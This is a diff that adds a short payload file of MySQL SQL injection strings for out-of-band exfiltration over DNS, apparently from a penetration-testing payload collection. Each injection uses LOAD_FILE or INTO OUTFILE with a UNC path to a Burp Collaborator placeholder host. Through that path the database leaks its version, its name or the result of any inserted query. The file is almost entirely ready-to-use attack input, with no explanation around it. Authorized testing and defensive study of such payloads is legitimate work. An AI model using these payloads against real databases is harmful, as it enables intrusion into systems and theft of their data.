@@ -1,0 +1,14 @@
+# MySQL — Out-of-Band (OOB) / DNS exfiltration
+# Requires Windows (LOAD_FILE) or INTO OUTFILE
+# Use Burp Collaborator or interactsh for listener
+
+# --- DNS lookup via LOAD_FILE (Windows only) ---
+' AND LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')--
+' AND 1=(SELECT LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'))--
+
+# --- DNS exfiltration via INTO OUTFILE (Windows only) ---
+' UNION SELECT version() INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'--
+' UNION SELECT database() INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'--
+
+# --- DNS exfiltration with query result ---
+' UNION SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'--
